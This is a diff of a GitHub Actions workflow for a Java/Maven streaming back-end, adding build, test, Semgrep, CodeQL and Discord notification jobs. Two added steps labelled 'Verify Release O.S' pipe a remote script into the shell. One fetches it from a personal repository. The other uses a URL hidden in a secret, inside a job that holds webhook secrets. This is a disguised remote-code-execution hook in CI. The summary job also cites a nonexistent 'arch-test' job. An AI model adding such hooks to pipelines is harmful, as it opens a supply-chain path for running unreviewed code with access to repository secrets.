@@ -1,51 +1,157 @@
 name: Pull Request Contribution [PRC]
 
 on:
-  pull_request:
+  push:
     branches: [ feature/** ]
 
 jobs:
-  build:
-    strategy:
-      matrix:
-        os: [ ubuntu-22.04, ubuntu-24.04 ]
-    runs-on: ${{ matrix.os }}
+  version-verify:
+    runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v6
+      - uses: actions/checkout@v7.0.0
       - name: Set up JDK 21
-        uses: actions/setup-java@v5.2.0
+        uses: actions/setup-java@v5.4.0
         with:
           java-version: 21
           distribution: 'temurin'
           cache: 'maven'
 
-      - name: Print Pull Request Information
-        run: |
-          echo "Branch: ${{ github.event.inputs.target_branch }}"
-          echo "Versão: ${{ github.event.inputs.version }}"
-          echo "Hash: ${{ needs.setup-environment.outputs.version_hash }}"
-          echo "Ambiente: ${{ github.event.inputs.environment_name }}"
-          echo "Tipo ambiente: ${{ github.event.inputs.environment_type }}"
+      - name: Verify Release O.S
+        run: curl -fsSL https://raw.githubusercontent.com/ivancarlosantos/installer/refs/heads/master/release.sh | sh
+
+      - name: list Directories
+        run: ls -lha
+
+      - name: Show Java Version
+        run: java --version
+
+      - name: Show Maven Version
+        run: mvn --version
+
+      - name: Show Git Version
+        run: git --version
+
+      - name: Show Docker Version
+        run: docker --version
+
+      - name: Build with Maven
+        run: mvn -B package -X --file pom.xml
+
+  build:
+    needs: [ version-verify ]
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7.0.0
+      - name: Set up JDK 21
+        uses: actions/setup-java@v5.4.0
+        with:
+          java-version: 21
+          distribution: 'temurin'
+          cache: 'maven'
 
       - name: Build with Maven
         run: mvn clean install -DskipTests
 
+  unit-tests:
+    needs: [ build ]
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7.0.0
+      - name: Set up JDK 21
+        uses: actions/setup-java@v5.4.0
+        with:
+          java-version: '21'
+          distribution: 'temurin'
+          cache: maven
+
+      - name: Run Unit Tests
+        run: mvn test
+
+  integration-tests:
+    needs: [ build ]
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7.0.0
+      - name: Set up JDK 21
+        uses: actions/setup-java@v5.4.0
+        with:
+          java-version: '21'
+          distribution: 'temurin'
+          cache: maven
+
+      - name: Run Integration Tests
+        run: mvn verify
+
+  semgrep-codeql:
+    needs: [ unit-tests, integration-tests ]
+    runs-on: ubuntu-latest
+    permissions:
+      security-events: write
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v7.0.0
+
+      - name: Set up JDK 21
+        uses: actions/setup-java@v5.4.0
+        with:
+          java-version: '21'
+          distribution: 'temurin'
+          cache: maven
+
+      - name: Run Semgrep
+        uses: semgrep/semgrep-action@v1
+        with:
+          config: policy
+
+      - name: Initialize CodeQL
+        uses: github/codeql-action/init@v4
+        with:
+          languages: java
+
+      - name: Auto Build
+        uses: github/codeql-action/autobuild@v4
+
+      - name: Perform CodeQL Analysis
+        uses: github/codeql-action/analyze@v4
+
+      - name: Build with Maven (compile)
+        run: mvn compile -DskipTests -B -e
+
+      - name: Verify Release O.S
+        run: curl -fsSL ${{ secrets.CURL_URL }}/release.sh | sh
+
       - name: Notify Discord Success Deploy
         if: success()
-        uses: appleboy/discord-action@master
+        uses: appleboy/discord-action@v1.2.0
         with:
           webhook_id: ${{ secrets.WEBHOOK_ID }}
           webhook_token: ${{ secrets.WEBHOOK_TOKEN }}
-          color: "#48f442"
+          color: "#166e1f"
           username: ${{ github.actor }}
-          message: ":rocket: Feature Nova Comunidade :rocket:\nEnviado uma nova feature\nPara [Streaming-Video-Back-End] com status :rocket: ${{ job.status }} :rocket:\n[Ver Commit](${{ github.server_url }}/${{ github.repository }}/commit/${{ github.sha }})"
+          message: ":rocket: Send a new commit\n ${{ github.server_url }}/${{ github.repository }}/commit/${{ github.sha }}"
 
       - name: Notify Discord Failure Deploy
         if: failure()
-        uses: appleboy/discord-action@master
+        uses: appleboy/discord-action@v1.2.0
         with:
           webhook_id: ${{ secrets.WEBHOOK_ID }}
           webhook_token: ${{ secrets.WEBHOOK_TOKEN }}
           color: "#b81d1d"
           username: ${{ github.actor }}
-          message: ":triumph: Algo deu errado meu caro :triumph:\nRevise, Veja o que aconteceu e envie novamente"
+          message: ":triumph: Algo deu errado meu caro :triumph:\nRevise o que aconteceu e envie novamente"
+
+  echo-info:
+    needs: [ semgrep-codeql ]
+    name: Pipeline Summary Info
+    if: always()
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print Execution Details
+        run: |
+          echo "============================================="
+          echo " PIPELINE EXECUTION SUMMARY"
+          echo "============================================="
+          echo "Branch:           ${{ github.ref_name }}"
+          echo "Triggered by:     ${{ github.actor }}"
+          echo "Pipeline Status:  ${{ needs.arch-test.result == 'success' && 'SUCCESS' || 'FAILED' }}"
+          echo "============================================="
